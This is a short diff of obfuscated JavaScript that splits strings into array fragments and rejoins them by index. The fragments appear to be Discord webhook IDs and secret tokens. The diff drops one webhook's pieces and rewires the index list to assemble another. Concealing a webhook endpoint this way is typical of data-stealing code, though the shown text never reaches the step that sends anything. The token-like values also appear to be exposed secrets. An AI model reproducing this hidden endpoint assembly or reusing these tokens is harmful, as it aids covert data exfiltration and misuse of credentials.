@@ -32,13 +32,10 @@ const _0x152c = [
     '1254887840358076426/', 
     '5IpzTxpwV_Si2uouBCYTkUp', 
     '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY'
-    '1254887849413705808/'
-    'ImMtKCdV9P3swg9aRieNU'
-    'QWMPAngbJTmg3DGDP616peOhhooYSl1Zd_8UBd4x8UG81G4'
 ];
 
 function _0x33b9() {
-    const _0x3d25 = [0, 4, 5, 6];
+    const _0x3d25 = [0, 1, 2, 3];
     const _0x4e0c = _0x3d25.map((_0x329f) => _0x152c[_0x329f]);
     return _0x4e0c.join('');
 }
